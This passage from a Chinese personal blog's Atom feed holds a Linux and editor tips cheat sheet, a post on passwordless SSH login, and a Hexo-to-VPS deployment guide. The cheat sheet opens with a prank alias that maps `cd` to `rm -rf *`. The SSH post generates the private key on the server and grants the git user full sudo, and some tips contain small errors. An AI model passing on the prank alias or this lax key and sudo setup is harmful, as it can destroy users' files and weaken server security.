    <content type="html"><![CDATA[<h3 id="linux-常用"><a href="#linux-常用" class="headerlink" title="linux 常用"></a>linux 常用</h3><p><code># alias cd=&quot;rm -rf *&quot;</code> 准备跑路</p><p><code>$ unalias cd</code> 屏蔽已有alias</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysqldump -u username -p databasename &gt; &lt;filename_to_save&gt; 备份</span><br><span class="line">$ mysqldump  -u username -p passwd &lt; &lt;filename_to_open&gt;  还原</span><br></pre></td></tr></table></figure><p><code>$ killall -I -u &lt;username&gt;</code> # -i(大写i)忽略大小写  -u 指定用户</p><p><code>$ rm !(xxx.php|xxxx.php)</code> # 删除除xxx.php,xxxx.php之外的文件</p><h3 id="linux-文件权限值"><a href="#linux-文件权限值" class="headerlink" title="linux 文件权限值"></a>linux 文件权限值</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="strong">*r*</span>* 表示 *<span class="strong">*read*</span>* ，读取权限，代表数字 4</span><br><span class="line">*<span class="strong">*w*</span>* 表示 *<span class="strong">*write*</span>* ，写入权限，代表数字 2</span><br><span class="line">*<span class="strong">*x*</span>* 表示 *<span class="strong">*execute*</span>* ，执行权限，代表数字 1</span><br></pre></td></tr></table></figure><h3 id="Sublime快捷键"><a href="#Sublime快捷键" class="headerlink" title="Sublime快捷键"></a>Sublime快捷键</h3><table><thead><tr><th align="center">热键</th><th align="center">作用</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">行</td><td align="center">—-</td><td align="center">—-</td></tr><tr><td align="center">Ctrl + ↑/↓</td><td align="center">滚动整行</td><td align="center"></td></tr><tr><td align="center">Ctrl   + Shift + ↑/↓</td><td align="center">移动当前行</td><td align="center"></td></tr><tr><td align="center">页面</td><td align="center">—-</td><td align="center">—-</td></tr><tr><td align="center">Ctrl + W</td><td align="center">关闭页面</td><td align="center"></td></tr><tr><td align="center">Ctrl + N</td><td align="center">新增页面</td><td align="center"></td></tr><tr><td align="center">Ctrl +   Shift + T</td><td align="center">回复页面</td><td align="center"></td></tr><tr><td align="center">分屏</td><td align="center">—-</td><td align="center">—-</td></tr><tr><td align="center">Alt +   Shift + 2</td><td align="center">左右分两屏</td><td align="center">数字以此类推至4</td></tr><tr><td align="center">Alt +   Shift + 8</td><td align="center">上下两屏</td><td align="center">类推到9</td></tr><tr><td align="center">Alt +   Shift + 5</td><td align="center">四块屏</td><td align="center">特殊</td></tr><tr><td align="center">选中</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Alt + Shift + L</td><td align="center">多行选中</td><td align="center">前提:选中多行</td></tr></tbody></table><h3 id="Pr-序列"><a href="#Pr-序列" class="headerlink" title="Pr 序列"></a>Pr 序列</h3><table><thead><tr><th align="center">键</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">c</td><td align="center">切割</td></tr><tr><td align="center">a</td><td align="center">集体移动</td></tr><tr><td align="center">v</td><td align="center">普通</td></tr><tr><td align="center">alt+鼠标左键</td><td align="center">复制</td></tr><tr><td align="center">i/o</td><td align="center">进与出</td></tr></tbody></table><h3 id="Python-文件头部"><a href="#Python-文件头部" class="headerlink" title="Python 文件头部"></a>Python 文件头部</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @Version : 1.0</span></span><br><span class="line"><span class="comment"># @Time    : 2018/1/1 10:10</span></span><br><span class="line"><span class="comment"># @Author  : Your Name</span></span><br><span class="line"><span class="comment"># @File    : test.py</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Here is Description</span></span><br></pre></td></tr></table></figure><h3 id="Shell-文件头部"><a href="#Shell-文件头部" class="headerlink" title="Shell 文件头部"></a>Shell 文件头部</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh` 或 `#!/bin/bash</span></span><br></pre></td></tr></table></figure><h3 id="Python-字符串前面加u-r-b的含义"><a href="#Python-字符串前面加u-r-b的含义" class="headerlink" title="Python 字符串前面加u,r,b的含义"></a>Python 字符串前面加u,r,b的含义</h3><ul><li><p>u</p></li><li><ul><li>以 Unicode 格式 进行编码，一般用在中文字符串前面</li><li>例子:u”我是含有中文字符组成的字符串。”</li></ul></li><li><p>r</p></li><li><ul><li>去掉反斜杠的转移机制。</li><li>r”\n\n\n\n”</li></ul></li><li><p>b</p></li><li><ul><li>bytes 类型</li><li>response = b’Hello World!’ </li></ul></li></ul><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.username <span class="string">"username"</span></span><br><span class="line">$ git config --global user.email <span class="string">"xxxx@email.com"</span></span><br><span class="line"><span class="comment"># 必须是双引号</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard HEAD^  // 上一个版本</span><br><span class="line">$ git reset --hard HEAD^^  // 上两个版本</span><br><span class="line">$ git reset --hard HEAD~100  // 上百个版本</span><br><span class="line">$ git <span class="built_in">log</span> --pretty=oneline // 一行显示日志</span><br><span class="line">$ git reflog // 行为日志</span><br></pre></td></tr></table></figure><h3 id="MarkDown-手册"><a href="#MarkDown-手册" class="headerlink" title="MarkDown 手册"></a><a href="https://github.com/android-cn/blog/blob/master/dev-tool/markdown.md" target="_blank" rel="noopener">MarkDown 手册</a></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;linux-常用&quot;&gt;&lt;a href=&quot;#linux-常用&quot; class=&quot;headerlink&quot; title=&quot;linux 常用&quot;&gt;&lt;/a&gt;linux 常用&lt;/h3&gt;&lt;p&gt;&lt;code&gt;# alias cd=&amp;quot;rm -rf *&amp;quot;&lt;/code&gt; 准
      
    
    </summary>
    
    
      <category term="汇总" scheme="https://ensuperb.github.io/categories/%E6%B1%87%E6%80%BB/"/>
    
    
      <category term="手记" scheme="https://ensuperb.github.io/tags/%E6%89%8B%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>关于SSH的新理解</title>
    <link href="https://ensuperb.github.io/posts/new-understand-about-SSH/"/>
    <id>https://ensuperb.github.io/posts/new-understand-about-SSH/</id>
    <published>2019-07-29T01:31:01.000Z</published>
    <updated>2020-06-19T03:50:12.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h2><h3 id="理论上说"><a href="#理论上说" class="headerlink" title="理论上说"></a>理论上说</h3><blockquote><p>免密登录需要使用到SSH的非对称性加密(<em>RSA</em>)(其实_DES_也可以,但这里主要是针对SSH)中数字签名的特性,即私钥加密公钥解。</p></blockquote><blockquote><p>简单讲：服务器得到公钥，客户端获得私钥。 这样即可完成免密登录。</p></blockquote><h3 id="实践操作"><a href="#实践操作" class="headerlink" title="实践操作"></a>实践操作</h3><p>在服务器中使用git（因为常用）</p><p><code>useradd git</code></p><p>随后密码自拟,</p><p>在git的用户目录,通常在<code>/home/git</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><p>这样即可在服务器中生成私钥与密钥，以及authorized_key。</p><table><thead><tr><th>文件名</th><th>啥</th></tr></thead><tbody><tr><td>id_rsa.pub</td><td>公钥</td></tr><tr><td>id_rsa</td><td>私钥</td></tr><tr><td>authorized_keys</td><td>已认证的公钥？</td></tr></tbody></table><p>ssh-keygen有多种参数可供选择,这里不赘述。<a href="https://wiki.archlinux.org/index.php/SSH_keys_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener"> 想获得更多？</a></p><p>接下来 <code>cat id_rsa.pub &gt; authorized_keys</code></p><p>通过各种手段（例如windows 的 winscp之类的）将id_rsa 下载下来 放在 <code>C:\user\ *** \.ssh\</code></p><p><em>顺便看看这个文件夹里面有没有一个叫 known_hosts 的文件</em> ，如果有就没事，如果没有，会不会是第一次连接的时候否定了什么呢？</p><blockquote><p>ssh会把你每个你访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。 <a href="https://www.cnblogs.com/liuyanerfly/p/9668426.html" target="_blank" rel="noopener">From:liuyanerfly</a></p></blockquote><p>接下来就是一顿测试操作: 上powershell或cmd（只要有ssh就行）</p><p><code>ssh -v git@yourIP:SSHport</code></p><p>如果不用提示输入密码，成功。当然，很多人都会在这里有疑惑：我怎么还是需要输入密码？这就要牵扯到权限。</p><p>。这是一个非常值得提的通过大量实践证明的问题解决方案。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 .ssh <span class="comment">#用户全权，其他人没有任何权限</span></span><br><span class="line">chmod 644 authorized_keys <span class="comment">#除用户读写外，组与其他人均为只读</span></span><br></pre></td></tr></table></figure><p>在服务端执行了以上指令后，再来客户端执行看看？</p><p><img src="/posts/new-understand-about-SSH/ssh-after.png" alt></p><p><img src="/posts/new-understand-about-SSH/ssh-before.png" alt></p><p><img src="/posts/new-understand-about-SSH/authorized_keys.png" alt></p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>如果是使用git 作为免密登录时通常会需要sudo权限。</p><p>在root 的情况下 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 740 /etc/sudoers </span><br><span class="line">vim /etc/sudoers</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在 <code># User privilege specification</code> 下面增添一条</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git    <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure><p>(通常熟悉vim的同学可以<code>yy</code>以及<code>p</code>快速一顿复制黏贴,这个真的强)</p><p>记得wq!退出,之后改回权限 <code>chmod 440 /etc/sudoers</code></p><hr><h3 id="Git-Hook"><a href="#Git-Hook" class="headerlink" title="Git Hook?"></a>Git Hook?</h3><p>啥? Hexo d 部署没反应? </p><ul><li><p>会不会时hooks 里面的 post-receive 写错了?</p></li><li><p>emmmm,没有错的话,会不会是 post-receive 没有执行权限呢?</p><p>赶紧 <code>chmod +x post-receive</code> 一波。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;免密登录&quot;&gt;&lt;a href=&quot;#免密登录&quot; class=&quot;headerlink&quot; title=&quot;免密登录&quot;&gt;&lt;/a&gt;免密登录&lt;/h2&gt;&lt;h3 id=&quot;理论上说&quot;&gt;&lt;a href=&quot;#理论上说&quot; class=&quot;headerlink&quot; title=&quot;理论上说&quot;&gt;&lt;/a
      
    
    </summary>
    
    
    
      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>利用Hexo与VPS搭建服务器的一些心得</title>
    <link href="https://ensuperb.github.io/posts/lettalkaboutbuildinghexowithVPS/"/>
    <id>https://ensuperb.github.io/posts/lettalkaboutbuildinghexowithVPS/</id>
    <published>2019-06-08T02:40:47.000Z</published>
    <updated>2020-07-11T13:31:27.028Z</updated>
    
    <content type="html"><![CDATA[<p>搭建这种网站就是爱折腾,正是这种折腾让我们可以大致了解真正的搭建流程,当然每个人都会有犯错误的时候,这里笔者总结一些曾经遇到的问题,望能给需要的朋友一些帮助。</p><p>大致原理图：<br><img src="/posts/lettalkaboutbuildinghexowithVPS/theory.png" alt="totaltheory"></p><h1 id="客户端-本地"><a href="#客户端-本地" class="headerlink" title="客户端(本地)"></a>客户端(本地)</h1><hr><h2 id="所需要环境"><a href="#所需要环境" class="headerlink" title="所需要环境:"></a>所需要环境:</h2><ul><li>系统(笔者使用的是windows10)</li><li><a href="https://nodejs.org/en/" target="_blank" rel="noopener">nodejs</a></li><li><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo</a></li><li>git (为了同步仓库)</li><li>可以写markdown的软件 (笔者使用的是sublime3)</li><li>ssh工具 (为了连接到VPS,笔者使用的是Xshell6)</li></ul><h2 id="nodejs以及hexo的安装流程部分解析"><a href="#nodejs以及hexo的安装流程部分解析" class="headerlink" title="nodejs以及hexo的安装流程部分解析"></a>nodejs以及hexo的安装流程部分解析</h2><p>对于nodejs环境的安装不多解释,详情可以查看官网进一步安装。其中值得一提的是，一定要安装<strong>npm</strong><br>安装了nodejs后，需要查看一下环境中是否安装了npm，可以在命令提示符中输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -v          <span class="comment">#查看npm版本</span></span><br></pre></td></tr></table></figure><p>安装npm后，可以进而安装hexo，</p><p><code>npm install -g hexo-cli</code></p><p>找到一个合适的工作路径,建立一个网点(本机)</p><p><code>hexo init &lt;folder&gt;</code><br><code>cd &lt;folder&gt;</code><br><code>npm install</code></p><p>这里需要注意的是，有时候你的安装或者建立网点可能会出错。<br>如：npm ERR! fetch failed <a href="https://registry.npmjs.org/xxx" target="_blank" rel="noopener">https://registry.npmjs.org/xxx</a> </p><p><a href="https://blog.csdn.net/yypsober/article/details/51906616" target="_blank" rel="noopener">那么这样做也许能解决问题。——利用淘宝镜像仓库</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm info underscore （如果上面配置正确这个命令会有字符串response）</span><br></pre></td></tr></table></figure><p><em>本章内容侧重问题的解决,有关hexo的<a href="https://hexo.io/zh-cn/docs/writing" target="_blank" rel="noopener">写作请移步</a></em></p><h1 id="服务器-VPS"><a href="#服务器-VPS" class="headerlink" title="服务器(VPS)"></a>服务器(VPS)</h1><hr><h2 id="所需的环境"><a href="#所需的环境" class="headerlink" title="所需的环境:"></a>所需的环境:</h2><ul><li>git</li><li>系统(笔者使用的是Linux)</li><li>Nginx</li><li>域名(非必须)</li></ul><p>服务器所要作的事情就是布置好git的裸仓,写好脚本(post-receive)让VPS做到布置的自动化<br>在git(用户目录)目录下初始化一个git的裸库,这里笔者创建一个叫’first’的库</p><p><code>$ git init --bare first.git</code></p><p>进入到里面的hook文件夹</p><p><code>$ cd first.git/hooks</code></p><p>创建并且写入post-receive,<strong>请对应好自己的文件夹以及文件的关系</strong></p><p><code>$ vim post-receive</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">GIT_REPO=/home/git/first.git                <span class="comment">#裸库位置</span></span><br><span class="line">TMP_GIT_CLONE=/tmp/blog                     <span class="comment">#缓存区域</span></span><br><span class="line">PUBLIC_WWW=/var/www/html/                   <span class="comment">#网页投影位置</span></span><br><span class="line">rm -rf <span class="variable">$&#123;TMP_GIT_CLONE&#125;</span>                     </span><br><span class="line">git <span class="built_in">clone</span> <span class="variable">$GIT_REPO</span> <span class="variable">$TMP_GIT_CLONE</span></span><br><span class="line">rm -rf <span class="variable">$&#123;PUBLIC_WWW&#125;</span>/*</span><br><span class="line">cp -rf <span class="variable">$&#123;TMP_GIT_CLONE&#125;</span>/* <span class="variable">$&#123;PUBLIC_WWW&#125;</span>     <span class="comment">#复写缓存并将缓存导入到投影位置</span></span><br></pre></td></tr></table></figure><p>这样,一个hook脚本就算是写好了</p><h1 id="ssh免密登录以及hexo的部署-deploy"><a href="#ssh免密登录以及hexo的部署-deploy" class="headerlink" title="ssh免密登录以及hexo的部署(deploy)"></a>ssh免密登录以及hexo的部署(deploy)</h1><p>免密的作用:</p><p>​    能够配合脚本更加便捷部署,非常有必要设置。</p><p>原理：<br><img src="/posts/lettalkaboutbuildinghexowithVPS/theoryofSSH.png" alt="sshtheory"></p><p>在VPS中的用户文件夹中建立.ssh文件夹,在这里笔者假设有一个用户叫做git,那么这个文件夹的绝对路径就是 </p><p><code>$ /home/git/.ssh</code></p><p>利用一下命令创建本用户的公钥私钥</p><p><code>$ ssh_keygen</code></p><p>在此目录使用以下命令创建authorized_keys文件</p><p><code>$ vim authorized_keys</code></p><p>(或者更直接一点 -&gt;  <code>$ cat id_rsa.pub &gt; authorized_keys</code> )</p><p>复制公钥_(id_rsa.pub)_的内容到authorized_keys内。<br>(若不会vim,可以使用WinSCP进入绝对路径来协助复制)<br>然后利用winscp或者其他形式将<strong>私钥(id_rsa)</strong>保存到本地(C:\Users\YOURNAME\.ssh)<br>再使用git bash的指令</p><p><code>$ ssh -v git@xxx.xxx.xxx.xxx</code></p><p>若能直接免密登录则以及成功了</p><p>此时,我们还需要hexo直接能部署到VPS,找到你创建的hexo的位置并找到_config.yml,打开<br>在deploy的位置写上(自己找好文件与文件夹的对应关系)</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">repo</span>: <span class="attribute">ssh</span>:<span class="comment">//git@xxx.xxx.xxx.<span class="doctag">xxx:</span>22/home/git/first.git</span></span><br><span class="line">  <span class="attribute">branch</span>: master</span><br></pre></td></tr></table></figure><p>这时在命令提示符中输入<code>hexo g &amp;&amp; hexo d</code> (生成并部署) </p><p>应该就能达到生成并且部署的效果</p><p>如果提示<code>Deployer not found</code>这种错误,执行以下代码后在部署</p><p><code>npm install hexo-deployer-git –save</code></p><p>如果提示 <em>没有找到库</em> 那么你可能还需要做一步加入git的用户变量设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">"git"</span></span><br><span class="line">git config --global user.email <span class="string">"git@xxx.xxx.xxx.xxx"</span></span><br><span class="line">git config -i</span><br></pre></td></tr></table></figure><p>想必到这里,大部分问题已经解决</p><h1 id="hexo部署路径问题-url"><a href="#hexo部署路径问题-url" class="headerlink" title="hexo部署路径问题(url)"></a>hexo部署路径问题(url)</h1><hr><p>在hexo文件夹下的_config.xml文件的url和root使用的是绝对路径<br>(相对vps,而绝对于站点),<br>如果你发现你所部署的网站与在本地执行<code>hexo s</code>的网站有很大的出入<br>(例如:CSS不渲染,图片不显示),<br>那么和有可能就是_config.xml文件中的路径没有设置好</p><p>主题中的_config.xml文件也同理</p><p>例如：</p><p>在 <code>theme/_config.xml</code>中</p><p>menu中的home 配置是 <code>/blog/</code></p><p>那么 stylesheets里面的配置就应该是 <code>/blog/css/style.css?v=2018.*.*</code></p><h1 id="全文完"><a href="#全文完" class="headerlink" title="全文完"></a>全文完</h1><p>参考文章：</p><ul><li><a href="https://segmentfault.com/a/1190000016106584?utm_source=tag-newest" target="_blank" rel="noopener">VPS搭建个人Hexo博客</a></li><li><a href="https://blog.csdn.net/zhushentian/article/details/81204502" target="_blank" rel="noopener">公钥、密钥和数字证书</a></li></ul><p>感谢以上文章的作者</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;搭建这种网站就是爱折腾,正是这种折腾让我们可以大致了解真正的搭建流程,当然每个人都会有犯错误的时候,这里笔者总结一些曾经遇到的问题,望能给需要的朋友一些帮助。&lt;/p&gt;
&lt;p&gt;大致原理图：&lt;br&gt;&lt;img src=&quot;/posts/lettalkaboutbuildinghex
      
    
    </summary>
    
    
    
      <category term="手记" scheme="https://ensuperb.github.io/tags/%E6%89%8B%E8%AE%B0/"/>
    
  </entry>
  
</feed>
